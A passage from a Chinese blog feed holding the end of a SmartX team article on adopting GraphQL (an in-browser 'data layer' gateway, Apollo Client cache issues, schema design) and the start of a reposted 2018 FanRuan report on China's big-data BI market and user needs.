开源的，但发展至今已经成为了典型的社区驱动项目。由社区主导的项目容易产生以下特点：</p><ul><li>方向经常变化，每一小段时间就有新的明星项目产生，但也经常有项目停止维护甚至废弃。</li><li>对于一些长期存在的设计缺陷缺乏修复的动力，往往要在下一个大版本重构时才被解决。</li></ul><p>为了在尽可能使用社区成果的同时避免“踩坑”，我们首先对各类项目及其维护者做了分类。从功能上分类，我们把这些项目分为 3 层：</p><ul><li>Spec 层面。<a href="https://link.zhihu.com/?target=https://spec.graphql.org/">GraphQL Spec</a> 是核心的部分，与语言无关，描述的是 GraphQL 的标准行为。本身由 GraphQL Working Group 维护，每一到两年发布一个新版本。本身非常稳定，在考察其它项目时我们会以对 Spec 的实现程度作为重要的评判标准。</li><li>实现层面。目前很多编程语言都对 GraphQL Spec 进行了实现，JavaScript 对应的 <a href="https://link.zhihu.com/?target=https://github.com/graphql/graphql-js">graphql-js</a> 是由官方维护的，目前也基本不存在替代品。</li><li>应用层面。和以上两个层面的稳定不同，社区在应用层面有层出不穷的项目，包含后端 server、前端 client、数据库 ORM 封装等很多方向。</li><li>工具链层面。同样有很多的项目，包含 lint、编译、测试各个方面。</li></ul><p>在调研的过程中我们每接触到一个新的项目，就会将其放在对应的层面，和同层同功能的其它项目进行比较，在比较的过程中更容易找到每个项目的优势和不足。</p><p>另一方面我们对项目背后的维护者也做出了描述性的判断，以我们最终采用的项目对应维护者为例：</p><ul><li>Apollo 是社区中的重要成员，本身也有商业化的 GraphQL 产品。在应用层面和工具链层面都维护了很多项目，但是对于解决项目中长期存在的设计缺陷动力比较匮乏。</li><li>Prisma 和 Apollo 类似，也有自己的商业化产品。相比之下 Prisma 更为激进，喜欢不断推出新的版本、项目来替代自己过去的项目。</li><li>The Guild，由社区组织，非常活跃地维护了几个高质量的项目。</li></ul><p>熟悉维护者的风格，阅读项目中长期存在的 issue，让我们提前了解到各个项目存在的“坑”和可能解决的时间点。再结合我们自己的接入计划，大大降低了后期实际使用时的风险。</p><h4 id="在内部系统里练习"><a href="#在内部系统里练习" class="headerlink" title="在内部系统里练习"></a>在内部系统里练习</h4><p>和很多公司一样，SmartX 也有一些内部系统的需求。这类系统大部分是 Web Service + Web UI 的形态，不涉及底层（虚拟化、分布式存储）的技术，所以交由前端组进行开发。</p><p>与产品主线相比，这些内部系统是验证新技术栈绝佳的试验田，因为它们：</p><ul><li>交付周期更灵活，有一定的试错空间。</li><li>自动化测试较少，Code Review 更侧重整体设计，代码合入速度快。</li><li>不需要过多考虑升级、兼容性等问题。</li><li>有一定的业务逻辑，一些系统里业务逻辑甚至相当复杂，更容易验证技术栈在各种场景下的表现。</li></ul><p>从 2019 年上半年开始，我们所有的内部系统都开始采用 GraphQL 作为 API 接口规范。其中最为突出的成果是我们用 1.5 个人力在 2 个月的时间里完成了售后系统的开发，不论在开发效率还是用户体验上都有令人满意的表现。</p><p>经过在内部系统里的实践，我们在 2019 年 6 月时做到了：</p><ol><li>熟悉 GraphQL 社区的进展，从众多项目中挑选出了几个适用于我们使用场景的进行长期投入。</li><li>拥有两名非常熟悉 GraphQL 的组员。</li></ol><h3 id="Data-Layer-浏览器内的-GraphQL-网关"><a href="#Data-Layer-浏览器内的-GraphQL-网关" class="headerlink" title="Data Layer: 浏览器内的 GraphQL 网关"></a>Data Layer: 浏览器内的 GraphQL 网关</h3><p>2019 年 5 月份，我们带着在内部系统中积累的经验回到产品主线的前端项目中，开始设计代号为 data layer 的纯前端 GraphQL 方案。</p><p>事实上 GraphQL Spec 从来没有限制 server 部分的运行环境，所以我们完全可以在浏览器内实现一个 GraphQL server 运行时。</p><h4 id="GraphQL-的执行方式"><a href="#GraphQL-的执行方式" class="headerlink" title="GraphQL 的执行方式"></a>GraphQL 的执行方式</h4><p>以一段 GraphQL schema 为例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># [] 代表数组，! 表示不能为 null</span><br><span class="line"></span><br><span class="line">type Query &#123;</span><br><span class="line">  users: [User!]!</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type User &#123;</span><br><span class="line">  name: String!</span><br><span class="line">  posts: [Post!]!</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type Post &#123;</span><br><span class="line">  title: String!</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我们要查询所有用户的姓名以及每个人写的文章的标题，就可以发起一个这样的查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">query &#123;</span><br><span class="line">  users &#123;</span><br><span class="line">    name</span><br><span class="line">    posts &#123;</span><br><span class="line">      title</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按照 GraphQL spec 的要求，server 在处理这个查询时的顺序依次是：</p><ol><li>以 query 作为入口，对应 schema 中的 type Query</li><li>向下执行 query.users。所谓执行（resolve）就是执行 server 中定义的对应 schema 节点的 resolver 函数。</li><li>继续向下依次执行 query.users.name，query.users.posts，query.users.posts.title。</li></ol><p>每个 schema 节点的 resolver 函数都会接收上层节点的返回值、查询输入的变量、当前上下文和一些额外信息作为参数，并返回一个符合 schema 类型定义的结果供下层节点继续执行。所有节点执行完毕后，最终的完整结果会返回给 client。</p><p>由此可见，resolver 函数的灵活性非常高，例如我们可能在 query.users 节点执行一次数据库查询得到结果，在 query.users.posts 中通过一次 HTTP 请求得到结果，在 query.users.posts.title 中从文件系统中读取结果，只要返回值符合 GraphQL schema 的定义即可。</p><h4 id="Data-Layer-的设计"><a href="#Data-Layer-的设计" class="headerlink" title="Data Layer 的设计"></a>Data Layer 的设计</h4><p>Data layer 运行在浏览器内，同时我们也希望前端 UI 代码通过标准的 GraphQL API 和它进行交互，这样我们可以随时将 data layer 迁移为独立的 NodeJS 服务。因此 data layer 的设计始终需要满足：</p><p>只使用 JavaScript 的标准 API，不使用任何浏览器 API，保证在 NodeJS 运行时中也可以正常工作。<br>UI 和 data layer 之间的通信必须是可以序列化的，而不能直接通过内存传递数据，保证远程调用的能力。<br>当 data layer 运行在浏览器内时，整体形态如图所示：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-b037803f10d010ed.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>在 data layer 内每个 GraphQL 请求执行时，会在对应的 resolver 函数内发出 HTTP 请求，从已有的后端服务中获取数据。</p><p>在这样的实现下，我们已经可以让我们的前端项目获得 GraphQL 带来的各种好处，只不过在网络请求方面不会比之前的 Restful API 有数量和数据量上的节省（因为 data layer 还是会发出基本等量的请求）。</p><p>需要注意的是，即使没有网络请求上的优势，data layer 依然帮助我们的前端代码很好地解决了长久存在的数据拼接抽象、数据缓存一致性、UI 正确更新等问题，这也说明数据裁剪绝对不是 GraphQL 唯一的价值。</p><p>在我们的计划中，如果 data layer 稳定的实现完我们 UI 代码中所有的数据请求代码，我们就可以将它迁移为独立的 NodeJS 服务，变成这样的形态：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-8ee1b251257ad78d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>进一步获得以下收益：</p><ul><li>数据裁剪，减少前后端的请求数量和数据量。</li><li>减少浏览器内的开销，提升用户体验。</li><li>data layer 离数据源（后端服务）更近，整体响应时间缩短。</li></ul><h3 id="阵痛：意料之中的挫折"><a href="#阵痛：意料之中的挫折" class="headerlink" title="阵痛：意料之中的挫折"></a>阵痛：意料之中的挫折</h3><p>时间来到 2019 年 8 月份，GraphQL 在我们的内部系统中已经使用了半年以上，data layer 也在产品主线的前端项目中加以应用。</p><p>在这个阶段我们开始遇到一些问题，值得庆幸的是这些问题在前期调研的过程中我们已经有所了解，因此尽管解决起来不太容易，但也不至于毫无头绪。</p><h4 id="Apollo-Client-缓存管理"><a href="#Apollo-Client-缓存管理" class="headerlink" title="Apollo Client 缓存管理"></a>Apollo Client 缓存管理</h4><p>在上文中提到的“响应式的级联缓存”并不是我们独创的概念，GraphQL 社区中最流行的客户端 Apollo Client 就一直在深度使用这一实现。</p><p>但是在 Apollo Client v2 的实现中，这层缓存一直存在一个致命的缺陷：缺少易用的缓存失效方式。官方文档中描述的 refectch 和 write cache 等方式在项目规模稍大时就会难以维护，而在社区中相关的讨论已经持续长达两年之久，直到今天 Apollo Client v3 的 RC 版本中给出的缓存失效方案仍然不能完全解决问题。</p><p>这一问题在我们的内部系统迭代半年之后也开始出现。当时我们有两个选择：</p><ol><li>等待官方承诺在 2019 年 10 月发布的 v3 版本解决这一问题。</li><li>在 Apollo Client 的基础上自行设计实现一个缓存失效方案。</li></ol><p>最终我们选择花半个月的时间完整理解 Apollo Client 的代码，再经过一周的设计之后完成了一个包含依赖追踪、UI 自动响应的缓存失效方案。我们之所以可以比社区更快地解决问题，是因为：</p><ul><li>我们可以不考虑向前、向后的兼容性问题，设计只为我们使用场景服务的方案。</li><li>我们可以在短时间内投入充足的人力，集中解决这一个问题。</li></ul><p>从这个过程中也可以看出，使用开源社区的方案并不代表永远不能出现分岔、无限制地等待 upstream 给出方案。</p><p>事实上我们甚至没有使用一个 fork 版本的 Apollo Client，而只是在上层代码中进行了封装，使用了一些 private API 就解决了问题。</p><h4 id="GraphQL-schema-也需要设计"><a href="#GraphQL-schema-也需要设计" class="headerlink" title="GraphQL schema 也需要设计"></a>GraphQL schema 也需要设计</h4><p>在应用 data layer 的过程中我们遭遇了另一个问题：怎么设计出“好用”的 GraphQL schema。</p><p>和任何一种 API 规范一样，GraphQL schema 也需要设计，而且与 RESTful API 等规范相比，GraphQL 最佳实践相关的资料还是非常少的。</p><p>在我们的 data layer 中，背后的数据源也不是非常灵活的数据库查询，而是几套比较复杂的 HTTP API。所以在实际的开发中，我们一边摸索最佳实践，一边在 schema 的易用性、请求数量、性能等方面做取舍，并且应用了相当复杂的批量处理和缓存策略进行优化，导致后期 data layer 的开发变成了一项技巧性工作。</p><p>严格来说这不是一个阻碍开发的问题，但确实限制了我们的效率。这也促使我们想在下一阶段在两方面做出改进：</p><ol><li>以独立后端服务的形式运行 GraphQL 网关，最好还能够使用数据库作为数据源。</li><li>从成熟的项目中借鉴一套 GraphQL schema 设计的最佳实践。</li></ol><h3 id="把握机会，真正的-GraphQL"><a href="#把握机会，真正的-GraphQL" class="headerlink" title="把握机会，真正的 GraphQL"></a>把握机会，真正的 GraphQL</h3><p>2019 年第四季度，在思考 data layer 的下一步方向时，我们突然获得了一个更好的机会：产品主线中会新增一个管理面产品。考虑到后端的同学需要将精力投入到其它更具挑战性的任务中，准备让前端组来负责新的管理面产品 Web 前、后端的开发。</p><p>这个机会不仅完美的贴合我们上一阶段总结出的改进方向，而且带来更大的发挥空间。在随后半年多的时间里，我们实现了：</p><ul><li>用数据库缓存所需数据，以独立后端服务的形式运行 GraphQL 网关，彻底解决了 data layer 中难以避免的性能问题，显著提升了用户体验。</li><li>基于 Prisma ORM 封装了一套功能完整、表达能力强的 GraphQL schema，降低 API 的设计和实现成本，提升了 API 的使用体验。</li><li>数据库、网关、UI 全链路的类型安全，让大多数问题在编译阶段暴露。同时开发代码生成工具，让一些数据交互复杂的 UI 组件可以直接通过数据库 schema 生成。</li><li>后端的同学可以全情投入底层的开发工作，不再需要为 UI 设计 API，也减少了很多联调的工作。</li></ul><p>2019 年 1 月，我们还是没有任何一名成员了解 GraphQL 的前端团队。</p><p>2020 年 5 月，我们已经是所有成员非常熟悉 GraphQL 使用、并且有 2 名成员精通 GraphQL 细节的管理产品团队。</p><p>这一过程中固然有机会和运气的作用，但如果我们从一开始就只是推动后端团队去帮助我们进行 GraphQL 改造，那么想必这一切也都不会发生。</p><p>如果你也认可我们处理工程问题的思路和方式，也欢迎<a href="https://link.zhihu.com/?target=https://www.smartx.com/jobs/">加入我们</a>。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 服务器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《2018年中国大数据BI行业分析报告》（全文）</title>
      <link href="/2023/04/07/%E3%80%8A2018%E5%B9%B4%E4%B8%AD%E5%9B%BD%E5%A4%A7%E6%95%B0%E6%8D%AEBI%E8%A1%8C%E4%B8%9A%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A%E3%80%8B%EF%BC%88%E5%85%A8%E6%96%87%EF%BC%89/"/>
      <url>/2023/04/07/%E3%80%8A2018%E5%B9%B4%E4%B8%AD%E5%9B%BD%E5%A4%A7%E6%95%B0%E6%8D%AEBI%E8%A1%8C%E4%B8%9A%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A%E3%80%8B%EF%BC%88%E5%85%A8%E6%96%87%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>[转]<a href="https://www.secrss.com/articles/1114">《2018年中国大数据BI行业分析报告》（全文）</a></p><p>近年来，随着人们的数据意识和数据素养不断提升，商业智能（BI，Business Intelligence）和数据分析领域迎来了快速发展期，据Gartner商业智能报告统计，到2020年全球的商业智能市场容量预计将达到228亿美元。</p><p>近年来，随着人们的数据意识和数据素养不断提升，商业智能（BI，Business Intelligence）和数据分析领域迎来了快速发展期，据Gartner商业智能报告统计，到2020年全球的商业智能市场容量预计将达到228亿美元。同时，大数据、人工智能、机器学习、深度学习等技术的快速发展，也促进了商业智能和数据分析产品的新一轮进化。</p><p>Gartner分析师认为，到2020年，自然语言生成和人工智能将是90%的新BI平台的标准特征，50%的分析查询将使用搜索、自然语言处理，或语音生成，或将自动生成。但我们必须认识到，我国商业智能的市场特征、企业需求、关注点、发展阶段均与国外有所不同，以Gartner为代表的分析机构并不能准确描述我国商业智能行业的实际状况。</p><p>针对这一问题，帆软数据应用研究院调研了规模不一的216家企事业单位，了解到他们的大数据BI应用状态、需求情况、对大数据BI产品功能的期待，同时基于帆软数据应用研究院对行业的长期观察和思考，形成了该篇报告。</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-b1ee891e9260feb5.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><p><strong>主要预测</strong></p><p>2018年，中国大数据 BI 产品将主要在自助分析的可操作性和功能丰富度、平台的安全性、数据管理能力、分析的共享能力、数据挖掘能力、大数据处理能力六大功能模块进行提升。</p><p><strong>2018年中国商业智能行业发展分析</strong></p><h1 id="一-行业总体形势向好"><a href="#一-行业总体形势向好" class="headerlink" title="(一) 行业总体形势向好"></a>(一) 行业总体形势向好</h1><p>在当前经济环境下，企业盈利的压力和难度不断增加，越来越多的企业，尤其是一、二线稍具业务规模的企业，其高层都希望通过精细化运营提升市场竞争力，降低企业的运营成本。这些企业绝大多数都已经在2008年<del>2015年间上线了各种业务系统，存储了大量管理和运营数据，具备应用大数据BI进行数据分析和数据化管理的各种条件，这些需求将在2018年</del>2022年继续爆发。值得注意的是，艾瑞咨询在《2017年中国商业智能行业研究报告》中指出，我国已经进入商业智能领域第一方阵，成为发展最快的国家之一，但和美国还有比较大的差距。所以未来中国大数据BI行业总体将呈现加速度增长，市场容量将不断扩大。</p><h1 id="二-大数据BI厂商马太效应显现"><a href="#二-大数据BI厂商马太效应显现" class="headerlink" title="(二) 大数据BI厂商马太效应显现"></a>(二) 大数据BI厂商马太效应显现</h1><p>马太效应是指强者越强，弱者越弱的现象，国内BI行业的马太效应已经显现。据帆软品牌部调研数据显示，处于行业第一梯队的帆软、Tableau、微软PowerBI的品牌知名度和市场份额与其他厂商进一步拉大。帆软2017年全年营收2.77亿，远超其他国内厂商之和。同时帆软销售部反映，2017年度销售跟单中遇到的竞品种类和数量均较2016年有相当大幅度的下降。BI行业出现马太效应实属必然，综合实力强大的厂商更能投入资源做好产品、服务，解决更多用户的需求和问题。可以预见，2018年中国BI行业马太效应将进一步增强，逐步淘汰掉实力弱、规模小、产品差的企业。</p><h1 id="三-新型自助式BI与传统型BI平分秋色"><a href="#三-新型自助式BI与传统型BI平分秋色" class="headerlink" title="(三) 新型自助式BI与传统型BI平分秋色"></a>(三) 新型自助式BI与传统型BI平分秋色</h1><p>得益于敏捷、自助的特征，从2013年起新型自助式BI迎来了高速发展期，这一时期也是传统型BI的衰退期。</p><p>2017年，传统型BI与新型自助式BI在国内市场中平分秋色。受访企业中，约50.2%的企业仍然在使用传统型BI，其中最典型的需求是企业常规日报、月报等汇总分析报告。约49.8%的企业应用新型自助式BI，通过报表平台+自助式BI+大数据底层平台的解决方案，来解决企业综合的数据展示和分析需求，形成经营和战略决策。在调研中我们注意到，约有18%的企业引进了新型自助式BI，部分或全部替代了传统BI。虽然传统型BI尤其自身优势和应用场景，但随着新型自助式BI的不断发展，传统型BI必将逐渐退出历史舞台，从国际传统BI巨头积极调整产品结构可见一斑。</p><p><strong>2017年中国商业智能用户状况分析</strong></p><p>根据企业的IT人员和业务人员在数据分析中的工作量和投入程度占比，我们将BI用户（企业）划分为5大类型，即BI应用金字塔模型，以更好的统计、分析企业的BI应用状况：</p><h1 id="一-BI应用金字塔模型"><a href="#一-BI应用金字塔模型" class="headerlink" title="(一) BI应用金字塔模型"></a>(一) BI应用金字塔模型</h1><h4 id="1-IT完全主导型"><a href="#1-IT完全主导型" class="headerlink" title="1. IT完全主导型"></a>1. IT完全主导型</h4><p>○其典型特征为，IT人员做底层数据仓库，以及BI工具层面的数据模型处理的所有相关工作，完成95%以上的BI分析页面（注：主要是指用于生产、经营、管理会议所需要的数据分析页面，下同）的开发。业务人员仅负责前端数据查看，完成查看报表时相关联动钻取操作。</p><p>○调研中发现，处于“IT完全主导型”这一等级的企业，约有93.2%都在使用传统型BI工具，企业的业务人员基本没有能力，也没有需求去自主完成数据分析的工作。这些企业的业务变革并不剧烈，企业管理层认为当前的日常数据报告能够满足企业管理和决策的需要，相对缺少变革的动力。</p><h4 id="2-IT强主导型"><a href="#2-IT强主导型" class="headerlink" title="2. IT强主导型"></a>2. IT强主导型</h4><p>○其典型特征为，IT人员做底层数据仓库，以及BI工具层面的数据模型处理的所有相关工作，完成80%~95%数量的BI分析页面。业务人员完成低于20%数量的BI分析页面。</p><p>○从调研数据来看，这类企业中，67.5%的企业认为当前业务人员不具备数据分析的能力。而企业需要快速完成部分数据分析工作，所以选择让IT人员更多承担工作。这类企业中普遍认为，商业智能产品本身并非能够快速上手，且业务人员仍需要统计学基础，阻碍数据分析工作从IT人员向业务人员的转移。</p><h4 id="3-业务强主导型"><a href="#3-业务强主导型" class="headerlink" title="3.业务强主导型"></a>3.业务强主导型</h4><p>○其典型特征为，IT人员做底层数据仓库，以及BI工具层面的数据模型处理的所有相关工作，完成前期示例不超过20%数量的BI分析页面。业务人员完成超过80%数量的BI分析页面。</p><p>○从调研数据来看，这类企业中，超过80.2%是曾经推行传统BI的企业，并且部分业务人员是有较高学历和能力的，能够学习和掌握商业智能工具和数据分析技能，并愿意在工作中积极使用；从帆软数据应用研究院的实地走访的部分企业来看，这些企业普遍行业排名靠前，公司从高层就重视数据分析工作。</p><h4 id="4-业务完全主导型"><a href="#4-业务完全主导型" class="headerlink" title="4.业务完全主导型"></a>4.业务完全主导型</h4><p>○其典型特征为，IT人员做底层数据仓库，以及BI工具层面的数据模型处理的部分相关工作。业务人员完成95%以上数量的BI分析页面和相当部分BI工具层面的数据模型处理。</p><p>○相比于第三类使用人群（业务强主导型），这类用户的一大特点是业务变革十分迅速，从事业务工作的人员学历普遍较高，业务经营和发展需要企业快速做出决策。而基于数据分析得出的业务判断相比个人历史经验准确度更高，是这类企业基本共识。比如在新兴的互联网企业，或者新零售领域，这个特点尤为突出。</p><h4 id="5-智能自助型"><a href="#5-智能自助型" class="headerlink" title="5.智能自助型"></a>5.智能自助型</h4><p>○其典型特征为，IT人员只做底层数据仓库、数据连接、数据字典相关工作。业务人员处理所有BI工具层面的数据处理，以及所有BI分析页面。</p><p>○IT人员搭建数据中心，业务人员完全自主处理和分析数据，这类企业有着明显的资源密集型的特点，业务人员更多的是偏向运营相关的工作。当然，因为此类受访企业占比较少，原因分析的可信度还有待进一步调研来核实。</p><h1 id="二-BI用户状况分布"><a href="#二-BI用户状况分布" class="headerlink" title="(二) BI用户状况分布"></a>(二) BI用户状况分布</h1><p>▊基于BI应用金字塔模型，2017年企业分布如下；</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-ca5424777708d452.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><p>○从调研数据中，我们可以得出两大结论：</p><p>1、IT人员主导企业数据分析的模式仍占据主流，也就是IT驱动仍是2017年企业商业智能平台应用现状。从数据调研的受访企业来看，有高达60.5%的企业的数据分析工作仍是第二类型（IT强主导型），甚至有21.5%的企业的数据分析工作处在第一类型（IT完全主导型），这显然和业务人员自助数据分析的目标距离遥远。</p><p>2、新型自助BI正在成为商业智能市场的主流。17.5%的企业是在2017年上线了新型自助BI，实现了让少部分业务人员自助完成BI数据分析的目标。</p><p><strong>2018年商业智能用户需求分析</strong></p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-ba5e3fe991e4769c.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><h1 id="一-企业多级部门数据分层次IT权限和平台管控，占受访企业97-6"><a href="#一-企业多级部门数据分层次IT权限和平台管控，占受访企业97-6" class="headerlink" title="(一) 企业多级部门数据分层次IT权限和平台管控，占受访企业97.6%"></a>(一) 企业多级部门数据分层次IT权限和平台管控，占受访企业97.6%</h1><p>○需求描述：BI工具支持企业的多级部门的数据/分析页面权限管控，使得不同层级的部门机构只能看到本部门机构和辖属部门机构的数据/分析页面。</p><p>○需求产生的原因：有的信息中心为释放压力，放权给业务部门使用数据，一旦口子打开，数据缺口就会像洪水一样泛滥，就又会走向另外一个极端，导致放权下的数据管理混乱，数据口径不统一，部门之间的数据壁垒等等问题就会出现，同时这将给企业带来极大的数据安全隐患。</p><p>○满足该需求对企业的价值和意义：在满足业务部门BI数据自助分析的同时，兼顾企业的数据权限管控，形成企业以IT部门集中管理下的良性数据分析风貌，杜绝企业数据安全隐患。</p><h1 id="二-业务人员可通过BI工具进行自助数据分析，占受访企业94-5"><a href="#二-业务人员可通过BI工具进行自助数据分析，占受访企业94-5" class="headerlink" title="(二) 业务人员可通过BI工具进行自助数据分析，占受访企业94.5%"></a>(二) 业务人员可通过BI工具进行自助数据分析，占受访企业94.5%</h1><p>○需求描述：业务人员可以在浏览器前端，对自己权限范围内的数据进行多维拖拽探索和自助分析，发掘隐含在数据中的业务价值。</p><p>○需求产生的原因：企业的传统信息化建设中，IT信息中心对公司数据进行高度集中的管控，来自企业各职能部门的数据处理以及报表就会全部由IT人员来输出，一旦业务部门需求集中扎堆，就会造成响应不足，业务部门怨声载道。信息中心自身成员熬夜加班做报表，成就感却很低。</p><p>○满足该需求对企业的价值和意义：通过高效灵活的BI工具，业务人员对自己权限范围内感兴趣数据进行多维拖拽探索和自助分析，以工具简单易上手的低学习成本，让真正对分析业务价值最熟悉的业务人员实现自助数据分析探索，最大化业务数据的分析维度和分析效率，灵活发掘数据中可能潜在的业务价值，同时也解放了IT人员的劳动力，降低企业人力成本。</p><h1 id="三-可快速搭建型自助BI业务数据模型，占受访企业87-5"><a href="#三-可快速搭建型自助BI业务数据模型，占受访企业87-5" class="headerlink" title="(三) 可快速搭建型自助BI业务数据模型，占受访企业87.5%"></a>(三) 可快速搭建型自助BI业务数据模型，占受访企业87.5%</h1><p>○需求描述：数据库表中的数据需要基于业务分析主题进行分类管理，相关数据表之间支持手动/自动构建关联模型，同时建立的关联模型支持灵活应用，无需反复编辑修改或创建新的模型，一次建立即可灵活满足多重业务场景进行数据分析使用。</p><p>○需求产生的原因：传统BI工具创建的底层数据关联相互独立，无法重复利用，一旦遇到新的业务数据计算分析场景，数据关联就需要修改或重新创建，极为麻烦，非常不利于IT人员维护。</p><p>○满足该需求对企业的价值和意义：通过BI工具快速构建的新型自助式BI业务数据模型，较传统BI工具针对不同业务分析场景需要多次、重复建模的应用痛点，极大地提高了BI工具的企业中业务数据分析应用的效率，解放了以往IT人员对数据维护的压力。</p><h1 id="四-OLAP多维分析：上卷、下钻、旋转、切片、联动、跳转等，占受访企业84-5"><a href="#四-OLAP多维分析：上卷、下钻、旋转、切片、联动、跳转等，占受访企业84-5" class="headerlink" title="(四) OLAP多维分析：上卷、下钻、旋转、切片、联动、跳转等，占受访企业84.5%"></a>(四) OLAP多维分析：上卷、下钻、旋转、切片、联动、跳转等，占受访企业84.5%</h1><p>○需求描述：BI工具支持强大的页面OLAP多维分析功能，包括分析视角的上卷、下钻，维度的旋转切换，指标的切换，分析数据的切片过滤，组件之间的联动过滤、页面超级链接跳转等。</p><p>○需求产生的原因：随着业务发展的复杂化，单一角度的数据分析往往难以再发掘出更多有价值的潜在业务信息，取而代之的是需要BI工具能够满足强大的页面OLAP多维分析功能。</p><p>○满足该需求对企业的价值和意义：通过BI工具强大的OLAP多维分析功能，以实现多角度、多关联数据之间的数据无限层次探索分析，发掘出数据中潜在的业务价值。</p><h1 id="五-大数据处理性能处理能力达到十亿数据秒级响应，占受访企业63-6"><a href="#五-大数据处理性能处理能力达到十亿数据秒级响应，占受访企业63-6" class="headerlink" title="(五) 大数据处理性能处理能力达到十亿数据秒级响应，占受访企业63.6%"></a>(五) 大数据处理性能处理能力达到十亿数据秒级响应，占受访企业63.6%</h1><p>○需求描述：BI工具可支撑处理亿级以上大数据分析计算的秒级响应，提供多维加速引擎对传统关系型数据仓库（SQLServer、Oracle、Mysql等）进行数据提速处理，同时也支持实时对接企业大数据平台（Vertical、Kylin、Greenplum等）进行数据分析计算。</p><p>○需求产生的原因：一方面，传统关系型数据库在面对上亿级别以上数据量时，容易出现性能瓶颈，长时间的查询等待往往会导致业务数据分析效率太低。另一方面，当今信息化水平飞速发展，越来越多的企业已经有了自己的高性能大数据平台，对于这部分企业来说，拥有一款能够直接对接大数据平台进行数据分析的工具尤为重要。</p><p>○满足该需求对企业的价值和意义：BI工具提供的强大数据计算处理引擎，能够降低企业数据查询等待时间成本，提高业务数据分析效率。同时，通过直接对接企业大数据平台，还可满足企业实时数据分析的需求。</p><h1 id="六-业务人员可完成工具层面的零代码数据加工处理工作，占受访企业57-5"><a href="#六-业务人员可完成工具层面的零代码数据加工处理工作，占受访企业57-5" class="headerlink" title="(六) 业务人员可完成工具层面的零代码数据加工处理工作，占受访企业57.5%"></a>(六) 业务人员可完成工具层面的零代码数据加工处理工作，占受访企业57.5%</h1><p>○需求描述：BI工具可通过快速易上手的交互方式，让业务人员也能完成工具层面的零代码数据加工处理工作，例如例如表合并、分组统计、结构数据分层、过滤、增加列、同比环比、累计值、所有值、公式运算等数据清洗和数据处理方法，实现对数据的无限层次多维透视分析统计。</p><p>○需求产生的原因：当业务需求相对偏复杂时，简单的维度和指标统计往往无法直接计算出业务所需要的计算结果，以往的处理方式往往可能是业务部门提需求给IT，然后IT经过SQL或者代码对底层数据表加工处理，然后最终导出一张excel数据表给业务部门，期间的反复沟通和等待时间往往降低了企业的业务数据分析应用效率。</p><p>○满足该需求对企业的价值和意义：通过BI工具，使得业务人员也能快速实现对数据的无限层次多维透视分和析加工统计，降低了传统模式下的沟通成本和等待时间，提高了企业业务数据分析的应用效率。</p><h1 id="七-移动端数据分析查看支持，占受访企业44-9"><a href="#七-移动端数据分析查看支持，占受访企业44-9" class="headerlink" title="(七) 移动端数据分析查看支持，占受访企业44.9%"></a>(七) 移动端数据分析查看支持，占受访企业44.9%</h1><p>○需求描述：BI工具支持移动端数据分析多维分析查看功能（兼容PC端的上卷、下钻、旋转、切片、联动、跳转等），对于BI工具的应用app支持便捷的扫码登陆、离线查看、批注、分享等功能，同时满足某些社区平台如微信、钉钉的企业公众号集成。</p><p>○需求产生的原因：在当今这个移动设备便捷时代，仅仅PC端的数据分析已经不能满足某些特定时间和场所的业务分析需求了，而BI对移动端的支持已经成了必然要满足的功能点。</p><p>○满足该需求对企业的价值和意义：通过移动端的BI分析查看，使得数据分析不仅仅局限于PC端，较大地增强了数据分析的便捷性。同时微信和钉钉的集成接入，让业务通过社区平台也能直接查看想要的数据分析页面，更是为移动端数据分析锦上添花。</p><p><strong>中国大数据BI产品功能预测</strong></p><p>结合用户需求调研，和我国BI厂商的产品计划研究，2018年如下六个大的功能模块将会得到增强：</p><h1 id="一-提升自助分析的可操作性和功能丰富度"><a href="#一-提升自助分析的可操作性和功能丰富度" class="headerlink" title="(一) 提升自助分析的可操作性和功能丰富度"></a>(一) 